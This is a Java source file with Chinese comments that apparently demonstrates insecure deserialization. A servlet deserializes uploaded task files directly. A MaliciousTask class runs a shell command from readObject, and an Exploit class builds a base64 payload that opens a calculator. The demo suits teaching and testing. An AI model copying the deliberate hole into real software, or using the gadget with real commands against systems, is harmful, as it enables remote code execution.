import java.io.*;
import java.util.*;
import javax.servlet.*;
import javax.servlet.http.*;

// 恶意任务类（可被反序列化触发）
class MaliciousTask implements Serializable {
    private String cmd;
    
    public MaliciousTask(String cmd) {
        this.cmd = cmd;
    }
    
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // 恶意代码执行
        Runtime.getRuntime().exec(cmd);
    }
}

// 任务管理系统核心类
class TaskManager {
    // 不安全的反序列化方法
    public static Object deserializeTask(InputStream is) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(is);
        return ois.readObject(); // 漏洞点：直接反序列化用户输入
    }
}

// Servlet处理类
@WebServlet("/importTask")
public class TaskImportServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
        throws ServletException, IOException {
            
        // 获取用户上传的序列化文件
        Part filePart = request.getPart("taskFile");
        InputStream fileContent = filePart.getInputStream();
        
        try {
            // 直接反序列化用户上传数据
            Object task = TaskManager.deserializeTask(fileContent);
            response.getWriter().write("Task imported successfully");
        } catch (Exception e) {
            response.getWriter().write("Import failed: " + e.getMessage());
        }
    }
}

// 模拟任务类
class Task implements Serializable {
    private String title;
    private String description;
    
    public Task(String title, String description) {
        this.title = title;
        this.description = description;
    }
    
    @Override
    public String toString() {
        return "Task{title='" + title + "', description='" + description + "'}";
    }
}

// 漏洞利用示例类（攻击者构造）
class Exploit {
    public static void main(String[] args) throws Exception {
        // 创建恶意序列化数据
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(new MaliciousTask("calc")); // 弹出计算器
        oos.flush();
        oos.close();
        
        // 输出base64编码的恶意payload
        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));
    }
}